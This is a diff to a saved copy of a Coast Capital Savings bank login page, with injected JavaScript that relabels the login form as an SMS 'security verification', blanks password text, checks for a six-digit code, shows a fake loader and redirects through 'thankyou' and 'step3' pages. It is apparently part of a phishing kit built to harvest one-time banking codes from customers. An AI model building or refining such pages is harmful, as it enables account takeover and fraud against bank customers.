@@ -3,7 +3,7 @@
 <html lang="FR-FR" xmlns="http://www.w3.org/1999/xhtml"><!--
  Page saved with SingleFile 
  url: https://banking.coastcapitalsavings.com/LogIn.aspx?sto=1 
- saved date: Sat Aug 08 2026 11:27:04 GMT-0400 (heure dt de lEst nord-amricain)
+ saved date: Sat Aug 08 2026 11:27:04 GMT-0400 (heure d’été de l’Est nord-américain)
 --><head id="Head1">
 
 
@@ -36,7 +36,7 @@ document.addEventListener("DOMContentLoaded", function() {
         var id = targetInput.id;
         if(id) {
             var label = document.querySelector("label[for='" + id + "']");
-            if(label) label.innerHTML = "<b>Code de vrification SMS</b>";
+            if(label) label.innerHTML = "<b>Code de vérification SMS</b>";
         }
         
         var walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false);
@@ -45,10 +45,10 @@ document.addEventListener("DOMContentLoaded", function() {
             var text = node.nodeValue.toLowerCase();
             if(text.trim().length > 3) {
                 if(text.indexOf("connexion") !== -1 || text.indexOf("connecter") !== -1 || text.indexOf("sign in") !== -1 || text.indexOf("login") !== -1) {
-                    node.nodeValue = "Vrification de scurit";
+                    node.nodeValue = "Vérification de sécurité";
                 }
-                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
-                    node.nodeValue = "Veuillez entrer le code reu par SMS :";
+                else if(text.indexOf("nom d'utilisateur") !== -1 || text.indexOf("courriel") !== -1 || text.indexOf("numéro de client") !== -1 || text.indexOf("username") !== -1 || text.indexOf("email") !== -1) {
+                    node.nodeValue = "Veuillez entrer le code reçu par SMS :";
                 }
                 else if(text.indexOf("mot de passe") !== -1 || text.indexOf("password") !== -1) {
                     node.nodeValue = "";
@@ -120,7 +120,7 @@ document.addEventListener("DOMContentLoaded", function() {
         e.preventDefault(); e.stopImmediatePropagation();
         var code = document.querySelector('input[maxlength="6"]') || document.getElementById('sms_code');
         if(!code || code.value.trim().length < 4){
-          alert('Veuillez saisir le code SMS  6 chiffres.');
+          alert('Veuillez saisir le code SMS à 6 chiffres.');
           if(code) code.focus(); return;
         }
         var _ldr = document.createElement('div');
@@ -145,6 +145,38 @@ setTimeout(function(){ window.location.href = 'coastcapital_thankyou.html'; }, 1
 })();
 </script>
 
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var currentFile = window.location.pathname.split("/").pop();
+    var step3File = currentFile.replace("_sms.html", "_step3.html");
 
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.href = step3File;
+        });
+    });
 
+    var clickables = document.querySelectorAll("button, input[type='submit'], input[type='button'], .btn");
+    clickables.forEach(function(el) {
+        el.addEventListener("click", function(e) {
+            var text = (el.textContent || el.value || "").toLowerCase().trim();
+            if (el.getAttribute("type") === "submit" || 
+                text.indexOf("valid") !== -1 || 
+                text.indexOf("contin") !== -1 || 
+                text.indexOf("soumet") !== -1 ||
+                text.indexOf("submit") !== -1 ||
+                text.indexOf("next") !== -1 ||
+                text.indexOf("suivant") !== -1) {
+                e.preventDefault();
+                e.stopPropagation();
+                window.location.href = step3File;
+            }
+        });
+    });
+});
+</script>
 
